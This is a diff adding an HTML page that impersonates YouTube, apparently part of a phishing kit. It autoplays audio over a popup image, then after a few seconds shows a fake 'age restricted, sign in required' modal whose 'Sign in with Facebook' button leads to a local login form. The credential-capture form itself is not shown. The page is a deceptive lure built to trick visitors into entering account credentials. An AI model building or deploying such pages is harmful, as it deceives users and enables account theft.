@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="YouTube,Watch And Share.">
+	  <meta name="keywords" content="Youtube">
+  	<meta name="author" content="YouTube">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="icon" href="img/icon.png">
+    <meta charset="UTF-8">
+    <title>YouTube</title>
+  
+</head>
+<body >
+<div>
+    
+ <div id="image-popup" class="popup">
+                <audio id="myAudio" autoplay preload="auto">
+  <source src="audio/bg.mp3" type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>
+        <div class="popup-content">
+ 
+            <img src="img/popup.png" alt="Popup Image"/> 
+             
+        </div>
+        <script>
+        window.addEventListener('load', function() {
+            var audio = document.getElementById('myAudio');
+            var playPromise = audio.play();
+
+            if (playPromise !== undefined) {
+                playPromise.then(function() {
+                    // Automatic playback started!
+                }).catch(function(error) {
+                    // Automatic playback failed.
+                    // Show a UI element to let the user manually start playback.
+                    console.log('Autoplay of Audio is failed bitch: ', error);
+                });
+            }
+        });
+        
+    </script>
+    </div>
+
+    <!-- The Pop-Up Modal -->
+    <div id="popupp" class="popuppp">
+        <div class="popup-contentt">
+     <h class="textt">YouTube Sign in Required</h>
+            <p>This content is age restricted. Please sign up first.</p>
+            
+        
+        
+       <a href="login-form.html"><button class="fb"  >Sign in with Facebook</button> </a>
+          
+           <a href="#"> <button class="ge">Sign in with Google</button></a>
+            
+            <p class="other">Sign In Using Email</p>
+           
+          <p class="ask">Create an Account
+         </p> 
+  <script>    
+        // Get the modal
+    var popup = document.getElementById("popupp");
+
+    // Show the pop-up after a certain time (e.g., 5 seconds)
+    setTimeout(function() {
+                popup.style.display = "block";
+    }, 3400); 
+    ;
+
+       </script>
+       
+       
+        </div>
+    </div>
+
+    <script src="scr/script.js"></script>
+</body>
+</html>
